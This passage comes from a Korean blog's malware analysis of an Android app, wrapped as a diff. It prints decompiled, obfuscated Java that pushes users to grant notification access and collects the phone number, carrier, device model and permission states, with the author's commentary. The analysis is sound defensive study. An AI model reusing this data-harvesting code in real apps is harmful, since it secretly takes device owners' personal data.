+</span></span><span style="display:flex;"><span>        string<span style="color:#f92672">.</span><span style="color:#a6e22e">call</span><span style="color:#f92672">(</span>string<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;getString(...)&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>jhLoO<span style="color:#f92672">.</span><span style="color:#a6e22e">okn</span><span style="color:#f92672">.</span><span style="color:#a6e22e">GAfXIJ</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        Toast<span style="color:#f92672">.</span><span style="color:#a6e22e">makeText</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> string<span style="color:#f92672">.</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;을 찾아 알림 접근을 허용해 주세요.&#34;</span><span style="color:#f92672">),</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">).</span><span style="color:#a6e22e">show</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        Intent intent <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Intent<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        intent<span style="color:#f92672">.</span><span style="color:#a6e22e">setFlags</span><span style="color:#f92672">(</span><span style="color:#ae81ff">268435456</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        startActivity<span style="color:#f92672">(</span>intent<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>여기서 중요한건 <code>get_user_data</code>로 라벨링 해놓은 메소드이다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Map <span style="color:#a6e22e">get_user_data</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[...]</span>
+</span></span><span style="display:flex;"><span>    XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span> zHbVuIv <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;uuid&#34;</span><span style="color:#f92672">,</span> decodeString<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span> zHbVuIv2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;number&#34;</span><span style="color:#f92672">,</span> GNXEC<span style="color:#f92672">.</span><span style="color:#a6e22e">GfKxQHQ</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ifwfG</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>GNXEC<span style="color:#f92672">.</span><span style="color:#a6e22e">GfKxQHQ</span><span style="color:#f92672">.</span><span style="color:#a6e22e">sUJ</span><span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">()</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        TiVm tiVm <span style="color:#f92672">=</span> TiVm<span style="color:#f92672">.</span><span style="color:#a6e22e">ifwfG</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        Object systemService <span style="color:#f92672">=</span> VqO<span style="color:#f92672">.</span><span style="color:#a6e22e">FHL</span><span style="color:#f92672">.</span><span style="color:#a6e22e">wiX</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getSystemService</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;phone&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        string<span style="color:#f92672">.</span><span style="color:#a6e22e">EKRSx</span><span style="color:#f92672">(</span>systemService<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;null cannot be cast to non-null type android.telephony.TelephonyManager&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        GNXEC<span style="color:#f92672">.</span><span style="color:#a6e22e">GfKxQHQ</span><span style="color:#f92672">.</span><span style="color:#a6e22e">sUJ</span> <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>TelephonyManager<span style="color:#f92672">)</span> systemService<span style="color:#f92672">).</span><span style="color:#a6e22e">getNetworkOperatorName</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span> zHbVuIv3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;operator&#34;</span><span style="color:#f92672">,</span> GNXEC<span style="color:#f92672">.</span><span style="color:#a6e22e">GfKxQHQ</span><span style="color:#f92672">.</span><span style="color:#a6e22e">sUJ</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    String MODEL <span style="color:#f92672">=</span> Build<span style="color:#f92672">.</span><span style="color:#a6e22e">MODEL</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    string<span style="color:#f92672">.</span><span style="color:#a6e22e">call</span><span style="color:#f92672">(</span>MODEL<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;MODEL&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span> zHbVuIv4 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;phone_type&#34;</span><span style="color:#f92672">,</span> MODEL<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    String<span style="color:#f92672">[]</span> strArr <span style="color:#f92672">=</span> GNXEC<span style="color:#f92672">.</span><span style="color:#a6e22e">GfKxQHQ</span><span style="color:#f92672">.</span><span style="color:#a6e22e">RhN</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> i3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>i3 <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        String str <span style="color:#f92672">=</span> strArr<span style="color:#f92672">[</span>i3<span style="color:#f92672">];</span>
+</span></span><span style="display:flex;"><span>        TiVm tiVm2 <span style="color:#f92672">=</span> TiVm<span style="color:#f92672">.</span><span style="color:#a6e22e">ifwfG</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>ContextCompat<span style="color:#f92672">.</span><span style="color:#a6e22e">checkSelfPermission</span><span style="color:#f92672">(</span>VqO<span style="color:#f92672">.</span><span style="color:#a6e22e">FHL</span><span style="color:#f92672">.</span><span style="color:#a6e22e">wiX</span><span style="color:#f92672">(),</span> str<span style="color:#f92672">)</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        i3<span style="color:#f92672">++;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span> zHbVuIv5 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;phone&#34;</span><span style="color:#f92672">,</span> Integer<span style="color:#f92672">.</span><span style="color:#a6e22e">valueOf</span><span style="color:#f92672">(</span>i<span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>    TiVm tiVm3 <span style="color:#f92672">=</span> TiVm<span style="color:#f92672">.</span><span style="color:#a6e22e">ifwfG</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span> zHbVuIv6 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;sms&#34;</span><span style="color:#f92672">,</span> Integer<span style="color:#f92672">.</span><span style="color:#a6e22e">valueOf</span><span style="color:#f92672">(</span>okn<span style="color:#f92672">.</span><span style="color:#a6e22e">GAfXIJ</span><span style="color:#f92672">(</span>VqO<span style="color:#f92672">.</span><span style="color:#a6e22e">FHL</span><span style="color:#f92672">.</span><span style="color:#a6e22e">wiX</span><span style="color:#f92672">())</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>    XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span> zHbVuIv7 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;contacts&#34;</span><span style="color:#f92672">,</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span> zHbVuIv8 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;image&#34;</span><span style="color:#f92672">,</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    Object systemService2 <span style="color:#f92672">=</span> VqO<span style="color:#f92672">.</span><span style="color:#a6e22e">FHL</span><span style="color:#f92672">.</span><span style="color:#a6e22e">wiX</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getSystemService</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;connectivity&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    string<span style="color:#f92672">.</span><span style="color:#a6e22e">EKRSx</span><span style="color:#f92672">(</span>systemService2<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;null cannot be cast to non-null type android.net.ConnectivityManager&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    ConnectivityManager connectivityManager <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>ConnectivityManager<span style="color:#f92672">)</span> systemService2<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>connectivityManager<span style="color:#f92672">.</span><span style="color:#a6e22e">isActiveNetworkMetered</span><span style="color:#f92672">()</span> <span style="color:#f92672">&amp;&amp;</span> connectivityManager<span style="color:#f92672">.</span><span style="color:#a6e22e">getRestrictBackgroundStatus</span><span style="color:#f92672">()</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        i2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span> zHbVuIv9 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;empower&#34;</span><span style="color:#f92672">,</span> mSzUY<span style="color:#f92672">.</span><span style="color:#a6e22e">pack_data</span><span style="color:#f92672">(</span>zHbVuIv5<span style="color:#f92672">,</span> zHbVuIv6<span style="color:#f92672">,</span> zHbVuIv7<span style="color:#f92672">,</span> zHbVuIv8<span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;network&#34;</span><span style="color:#f92672">,</span> Integer<span style="color:#f92672">.</span><span style="color:#a6e22e">valueOf</span><span style="color:#f92672">(</span>i2<span style="color:#f92672">)),</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;accessibility&#34;</span><span style="color:#f92672">,</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">),</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span>NotificationCompat<span style="color:#f92672">.</span><span style="color:#a6e22e">CATEGORY_MESSAGE</span><span style="color:#f92672">,</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">),</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;battery&#34;</span><span style="color:#f92672">,</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">)));</span>
+</span></span><span style="display:flex;"><span>    String RELEASE <span style="color:#f92672">=</span> Build<span style="color:#f92672">.</span><span style="color:#a6e22e">VERSION</span><span style="color:#f92672">.</span><span style="color:#a6e22e">RELEASE</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    string<span style="color:#f92672">.</span><span style="color:#a6e22e">call</span><span style="color:#f92672">(</span>RELEASE<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;RELEASE&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> mSzUY<span style="color:#f92672">.</span><span style="color:#a6e22e">pack_data</span><span style="color:#f92672">(</span>zHbVuIv<span style="color:#f92672">,</span> zHbVuIv2<span style="color:#f92672">,</span> zHbVuIv3<span style="color:#f92672">,</span> zHbVuIv4<span style="color:#f92672">,</span> zHbVuIv9<span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> XZD<span style="color:#f92672">.</span><span style="color:#a6e22e">ZHbVuIv</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;android_v&#34;</span><span style="color:#f92672">,</span> RELEASE<span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>READ_PHONE_STATE 같은 권한이 있으면 전화번호도 읽고, 기기 모델명 같은 여러 정보들을 수집한다.<br>
+전화번호도 가공하는 함수들을 보면 010, 011, 016 이런 prefix 가진 애들을 걸러서 저장하는 것 같다.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://msh1307.kr/tags/malware/">malware</a></li>
+      <li><a href="https://msh1307.kr/tags/android-malware/">Android malware</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2025 <a href="https://msh1307.kr">msh1307</a></span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
